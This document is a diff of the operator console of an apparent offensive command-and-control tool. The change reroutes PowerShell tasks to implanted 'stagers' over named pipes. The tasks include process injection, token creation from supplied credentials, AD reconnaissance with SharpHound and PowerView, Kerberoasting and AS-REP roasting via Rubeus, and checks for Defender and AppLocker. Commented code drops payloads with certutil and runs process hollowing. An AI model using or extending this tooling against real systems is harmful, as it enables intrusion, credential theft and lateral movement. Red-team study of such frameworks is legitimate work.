@@ -1085,7 +1085,7 @@ class mymainclass():
                         continue
                     self.__t_myserver.stop_pipe_listener(user_input_listener)
                     continue
-                
+
                 if command_id == self.__t_myconstant.CMD_PIPE_LISTENER_LIST:
                     self.__t_myserver.print_pipe_listener()
                     continue
@@ -1201,7 +1201,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETNETVERSION2:
@@ -1213,7 +1213,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION2)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETNETVERSION2)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETPID:
@@ -1225,7 +1225,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPID)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETPID)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETPSTREE:
@@ -1240,13 +1240,13 @@ class mymainclass():
                     if ("Get-ProcessTree.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Get-ProcessTree.ps1")
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Get-ProcessTree.ps1")
                     else:
                         print("Get-ProcessTree already loaded")
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETPSTREE2:
@@ -1261,13 +1261,13 @@ class mymainclass():
                     if ("Get-ProcessTree.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Get-ProcessTree.ps1")
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Get-ProcessTree.ps1")
                     else:
                         print("Get-ProcessTree already loaded")
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE2)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETPSTREE2)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETCLM:
@@ -1279,7 +1279,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETLANGMODE)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETLANGMODE)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETAV:
@@ -1291,7 +1291,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDEFENDER)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETDEFENDER)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_GETAL:
@@ -1303,7 +1303,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETAPPLOCKER)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETAPPLOCKER)
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_MAKETOKEN:
@@ -1324,7 +1324,7 @@ class mymainclass():
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-SharpSploit.ps1")
                         #call psrun with tag psload
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-SharpSploit.ps1")
                     
@@ -1338,8 +1338,8 @@ class mymainclass():
                     if user_input_confirm != "y":
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
                     
                     
                     continue
@@ -1352,7 +1352,7 @@ class mymainclass():
                 #     if user_input_stager not in self.__t_myserver.get_running_stager():
                 #         print("Please input a valid stager uuid")
                 #         continue
-                #     self.__t_myserver.create_command(user_input_stager,"psreset","dummy")
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"psreset","dummy")
                 #     self.__t_myserver.clean_psloadlist(user_input_stager)
                 #     continue
                 
@@ -1379,7 +1379,7 @@ class mymainclass():
 
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-inject.ps1")
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-inject.ps1")
                     else:
                         print("Inject already loaded")
@@ -1390,7 +1390,7 @@ class mymainclass():
                     if user_input_confirm != "y":
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-inject \"{}\"".format(user_input_target))
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps","Invoke-inject \"{}\"".format(user_input_target))
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_SHARPHOUND3:
@@ -1405,7 +1405,7 @@ class mymainclass():
                     if ("Invoke-Sharphound3.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-Sharphound3.ps1")
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Sharphound3.ps1")
                     else:
                         print("Sharphound3 already loaded")
@@ -1416,7 +1416,7 @@ class mymainclass():
                     if user_input_confirm != "y":
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.SHARPHOUND3.format(user_input_domain))
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.SHARPHOUND3.format(user_input_domain))
                     continue
                 
                 # if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
@@ -1442,11 +1442,11 @@ class mymainclass():
                     if ("PowerView.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("PowerView.ps1")
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"PowerView.ps1")
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDOMAIN)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.GETDOMAIN)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_LS:
@@ -1458,7 +1458,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps","ls")
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps","ls")
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_CD:
@@ -1480,8 +1480,8 @@ class mymainclass():
                     if user_input_confirm != "y":
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps","cd {}".format(user_input_path))
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps","cd {}".format(user_input_path))
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
                     
                     
                     continue
@@ -1502,7 +1502,7 @@ class mymainclass():
                 #     if user_input_confirm != "y":
                 #         continue
 
-                #     self.__t_myserver.create_command(user_input_stager,"download",user_input_path)
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"download",user_input_path)
                 #     continue
                 
                 # if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSREMOTE:
@@ -1521,7 +1521,7 @@ class mymainclass():
                 #     if user_input_confirm != "y":
                 #         continue
 
-                #     self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
                 #     self.__t_myserver.clean_psloadlist(user_input_stager)
                 #     continue
 
@@ -1552,14 +1552,14 @@ class mymainclass():
                 #     if user_input_confirm != "y":
                 #         continue
 
-                #     self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
                 #     self.__t_myserver.clean_psloadlist(user_input_stager)
 
                 #     t_psloader = ps_loader() #right after reset, no need to check list
                 #     t_result = t_psloader.load_ps("Invoke-myclient.ps1")
-                #     self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                 #     self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
-                #     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                     
                     
                 #     continue
@@ -1587,12 +1587,12 @@ class mymainclass():
                     if ("Invoke-myclient.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-myclient.ps1")
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-myclient.ps1")
                     else:
                         print("Payload already loaded")
                     
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.PSJOB.format("Invoke-myclient"))
                     
                     
                     continue
@@ -1606,7 +1606,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.WHOAMI)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.WHOAMI)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_HOSTNAME:
@@ -1618,7 +1618,7 @@ class mymainclass():
                         print("Please input a valid stager uuid")
                         continue
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.HOSTNAME)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.HOSTNAME)
                     continue
 
                 # if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSJUMP_EXE:
@@ -1652,12 +1652,12 @@ class mymainclass():
                 #     if user_input_confirm != "y":
                 #         continue
                     
-                #     self.__t_myserver.create_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"psremote",self.__t_mybuildin.PSREMOTE.format(user_input_target))
                 #     self.__t_myserver.clean_psloadlist(user_input_stager)
 
-                #     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.B64_SAVE.format(tosend,user_input_path,t_name))
-                #     self.__t_myserver.create_command(user_input_stager,"ps","certutil -decode {} {}".format(os.path.join(user_input_path,"{}.txt".format(t_name)),os.path.join(user_input_path,"{}.exe".format(t_name))))
-                #     self.__t_myserver.create_command(user_input_stager,"ps","Start-Process {}".format(os.path.join(user_input_path,"{}.exe".format(t_name))))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.B64_SAVE.format(tosend,user_input_path,t_name))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"ps","certutil -decode {} {}".format(os.path.join(user_input_path,"{}.txt".format(t_name)),os.path.join(user_input_path,"{}.exe".format(t_name))))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"ps","Start-Process {}".format(os.path.join(user_input_path,"{}.exe".format(t_name))))
                     
                     
                 #     continue
@@ -1677,14 +1677,14 @@ class mymainclass():
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
                         #call psrun with tag psload
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
                     
                     else:
                         print("Rubeus already loaded")
 
-                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.KERBER)
+                    self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.KERBER)
                     continue
 
                 if command_id == self.__t_myconstant.CMD_PIPE_STAGER_TOOLS_ASREP:
@@ -1702,7 +1702,7 @@ class mymainclass():
                         t_psloader = ps_loader()
                         t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
                         #call psrun with tag psload
-                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                         #update the list
                         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
                     
@@ -1711,9 +1711,9 @@ class mymainclass():
 
                     user_input_confirm = input("y for john, default hashcat: ")
                     if user_input_confirm != "y":
-                        self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP_HC)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP_HC)
                     else:
-                        self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP)
+                        self.__t_myserver.create_pipe_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP)
 
                     continue
 
@@ -1743,7 +1743,7 @@ class mymainclass():
                 #     if ("Invoke-msf.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
                 #         t_psloader = ps_loader()
                 #         t_result = t_psloader.load_ps("Invoke-msf.ps1")
-                #         self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                #         self.__t_myserver.create_pipe_command(user_input_stager,"psload",t_result)
                 #         #update the list
                 #         self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-msf.ps1")
                 #     else:
@@ -1756,7 +1756,7 @@ class mymainclass():
                 #     print("3: process hollowing")
 
                 #     user_input_tech = input("Please enter tech id: ")
-                #     self.__t_myserver.create_command(user_input_stager,"ps","Invoke-msf {}".format(user_input_tech))
+                #     self.__t_myserver.create_pipe_command(user_input_stager,"ps","Invoke-msf {}".format(user_input_tech))
 
                     
                 #     continue
